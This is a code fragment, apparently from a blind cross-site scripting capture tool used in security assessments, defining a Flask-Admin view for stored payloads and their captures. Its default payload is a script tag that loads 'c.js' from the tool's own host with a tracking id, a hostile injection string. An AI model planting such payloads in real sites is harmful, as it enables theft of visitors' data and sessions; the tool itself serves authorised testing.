...
class PayloadView(ModelView):
    ...
    # Column tweaks
    column_list = ('id', 'assessments', 'captured', 'payload', 'url', 'method', 'parameter', 'notes')
    column_sortable_list =  ('id','assessments', 'captured', 'payload', 'url', 'method', 'parameter')
    column_filters = ('id', 'assessment', 'payload', 'url', 'method', 'parameter')
    ...
    column_formatters = dict(captured =lambda v, c, m, p: Capture.query.filter_by(payload_id=m.id).first().id \
        if Capture.query.filter_by(payload_id=m.id).first() != None else "None", \
        payload=lambda v, c, m, p: m.payload.replace("$1","//" + app.config['HOSTNAME'] + "/c.js?u=" + str(m.id)))
    # Make form use dropdown boxes, default text, required form elements
    form_overrides = dict(method=SelectField, notes=TextAreaField)
    form_args = dict(
        method=dict(
            choices=[('GET', 'GET'), ('POST', 'POST'), ('PUT', 'PUT'), ('DELETE', 'DELETE')]
        ),payload=dict(description="Use $1 as a placeholder for the Javascript URL.",\
        default="<script src=$1></script>", validators=[validators.required()]
        ),assessment=dict(validators=[validators.required()]
        )
        )
